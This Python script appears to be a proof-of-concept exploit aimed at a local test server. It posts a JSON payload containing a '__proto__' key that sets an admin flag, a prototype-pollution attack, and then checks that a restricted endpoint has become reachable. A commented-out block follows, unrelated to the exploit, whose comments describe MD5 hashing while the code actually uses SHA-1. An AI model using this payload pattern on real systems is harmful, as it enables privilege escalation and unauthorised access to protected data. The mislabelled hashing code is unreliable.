import requests


payload = {
'a': 5,
'b': 3,
'__proto__': {
    'SuperAdminForSuperWebSite__': True
}
}

def exploit(host, payload):
    restricted_url = host + '/FeedBackEndpointTest'
    exploitable_url = host + '/FeedBackEndpointTest'

    print(' This will fail:')
    print( requests.get(restricted_url) )

    print(' Running exploit...')
    print( requests.post(exploitable_url, json=payload))
    print('Done.')

    print(' This will succeed:')
    print( requests.get(restricted_url) )
    print(requests.get(restricted_url).text)

if __name__ == '__main__':
    exploit('http://localhost:4444', payload)


#  import hashlib

#  def calculate_md5_hash(data):
#       Create an MD5 hash object
#      md5_hash = hashlib.sha1()

#       Update the hash object with the byte representation of the data
#      md5_hash.update(str(data).encode('utf-8'))

#       Return the hexadecimal representation of the hash
#      return md5_hash.hexdigest()

#  def main():
#       Create a list of numbers from 1 to 100
#      numbers = list(range(1, 101))

#       Create a dictionary to store the numbers and their corresponding MD5 hashes
#      md5_hashes = {}

#       Calculate the MD5 hash for each number and store it in the dictionary
#      for number in numbers:
#          md5_hashes[number] = calculate_md5_hash(number)

#       Print the results
#      for i, (number, md5_hash) in enumerate(md5_hashes.items(), start=1):
#          print(f"{i}: {{ {number}: '{md5_hash}' }},")

#  if __name__ == "__main__":
#      main()
